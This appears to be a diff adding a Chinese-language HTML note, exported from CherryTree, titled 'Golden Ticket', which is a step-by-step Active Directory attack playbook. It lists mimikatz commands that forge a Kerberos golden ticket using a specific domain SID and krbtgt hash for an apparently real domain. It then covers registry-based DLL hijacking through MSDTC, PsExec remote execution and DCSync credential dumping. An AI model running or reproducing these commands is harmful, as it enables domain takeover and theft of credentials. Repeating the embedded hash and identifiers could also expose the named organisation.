@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>黄金票据</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>黄金票据</h1><br/>1、在域控电脑上获取krbtgt用户的hash值<br />2、在普通域用户电脑上执行<br />mimikatz<br />kerberos::golden /user:administrator /domain:rd.supcon.com /sid:S-1-5-21-3197435977-3410678607-2977642309 /krbtgt:4FE0A785CC670159FFF1C049E5A9EB95 /ptt<br />(这里的SID指的是域的SID，而不是账户的SID，及账户SID除去最后一个-和后面的值)<br />账户SID：S-1-5-21-3197435977-3410678607-2977642309-5981<br />域的SID：S-1-5-21-3197435977-3410678607-2977642309<br /><br />利用成功的话，需要确保当前有一个有效的域用户的票据<br />管理员权限下用klist查看<br />3、管理员权限打开cmd<br />4、利用前提：对方关闭防火墙<br />net use \\xxx.rd.supcon.com\c$<br />reg query \\xxx\HKLM\SOFTWARE\Microsoft\MSDTC\MTxOCI /v OracleOciLibPath<br />reg add \\xxx\HKLM\SOFTWARE\Microsoft\MSDTC\MTxOCI /v OracleOciLibPath /t REG_SZ /d &quot;C:\ProgramData&quot; /f<br />copy oci.dll \\xxx\c$\ProgramData\oci.dll<br /><br />利用psexec执行任意代码<br />PsExec.exe  \\remoteapp1.rd.supcon.com cmd.exe /accepteula<br /><br />可以查询任意用户的hash<br />mimikatz<br />lsadump::dcsync /user:xxx /domain:rd.supcon.com<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
